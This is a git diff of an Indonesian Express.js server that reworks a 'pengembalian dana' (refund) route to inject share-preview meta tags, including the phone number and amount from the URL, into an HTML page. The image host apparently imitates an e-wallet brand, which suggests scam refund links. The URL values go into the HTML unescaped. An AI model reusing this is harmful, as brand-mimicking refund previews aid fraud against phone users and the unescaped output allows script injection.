@@ -1,6 +1,7 @@
 const express = require("express");
 const axios = require("axios");
 const path = require("path");
+const fs = require("fs");
 const mongoose = require("mongoose");
 const app = express();
 
@@ -690,7 +691,7 @@ app.post("/api/pencairan", async (req, res) => {
 });
 
 /* =========================
-   ROUTE DEMO
+   ROUTE PENGEMBALIAN
 ========================= */
 
 app.get("/pengembalian/:phone/:nominal", (req, res) => {
@@ -703,7 +704,7 @@ app.get("/pengembalian/:phone/:nominal", (req, res) => {
 
     if (!phone || !nominal) {
         return res.status(400).send(
-            "Data tidak lengkap"
+            "Data pengembalian tidak lengkap"
         );
     }
 
@@ -720,96 +721,125 @@ app.get("/pengembalian/:phone/:nominal", (req, res) => {
     }
 
     /* =========================
-       META PREVIEW
+       DATA META
     ========================= */
 
     const title =
         `PENGEMBALIAN DANA ${phone}`;
 
-    const image =
-        "https://danaaid.dmpett-dgtall.it.com/assets/preview-pengembalian.jpg";
-
     const description =
         "Informasi Pengembalian Dana";
 
+    const image =
+        "https://danaaid.dmpett-dgtall.it.com/assets/preview-pengembalian.jpg";
+
+    const pageUrl =
+        `${req.protocol}://${req.get("host")}${req.originalUrl}`;
+
+
     /* =========================
-       KIRIM HTML
+       BACA HTML
     ========================= */
 
-    res.send(`
-<!DOCTYPE html>
-<html lang="id">
+    const filePath =
+        path.join(
+            __dirname,
+            "pengembalian.html"
+        );
 
-<head>
 
-    <meta charset="UTF-8">
+    fs.readFile(
+        filePath,
+        "utf8",
+        (err, html) => {
 
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1.0"
-    >
+            if (err) {
 
-    <title>${title}</title>
+                console.log(err);
 
-    <meta
-        property="og:title"
-        content="${title}"
-    >
+                return res.status(500).send(
+                    "Gagal membuka halaman"
+                );
 
-    <meta
-        property="og:description"
-        content="${description}"
-    >
+            }
 
-    <meta
-        property="og:image"
-        content="${image}"
-    >
 
-    <meta
-        property="og:type"
-        content="website"
-    >
+            /* =========================
+               META TAG
+            ========================= */
 
-    <meta
-        property="og:url"
-        content="${req.protocol}://${req.get("host")}${req.originalUrl}"
-    >
+            const meta = `
 
-    <meta
-        name="twitter:card"
-        content="summary_large_image"
-    >
+<title>${title}</title>
 
-    <meta
-        name="twitter:title"
-        content="${title}"
-    >
+<meta
+    property="og:title"
+    content="${title}"
+>
 
-    <meta
-        name="twitter:description"
-        content="${description}"
-    >
+<meta
+    property="og:description"
+    content="${description}"
+>
 
-    <meta
-        name="twitter:image"
-        content="${image}"
-    >
+<meta
+    property="og:image"
+    content="${image}"
+>
 
-</head>
+<meta
+    property="og:type"
+    content="website"
+>
 
-<body>
+<meta
+    property="og:url"
+    content="${pageUrl}"
+>
 
-    <h1>${title}</h1>
+<meta
+    name="twitter:card"
+    content="summary_large_image"
+>
 
-    <p>Nomor: ${phone}</p>
+<meta
+    name="twitter:title"
+    content="${title}"
+>
 
-    <p>Nominal: Rp${nominal}</p>
+<meta
+    name="twitter:description"
+    content="${description}"
+>
 
-</body>
+<meta
+    name="twitter:image"
+    content="${image}"
+>
 
-</html>
-    `);
+`;
+
+
+            /* =========================
+               MASUKKAN META
+               KE DALAM HEAD
+            ========================= */
+
+            html =
+                html.replace(
+                    "</head>",
+                    meta + "</head>"
+                );
+
+
+            /* =========================
+               KIRIM HTML ASLI
+            ========================= */
+
+            res.send(html);
+
+        }
+    );
 
 });
 
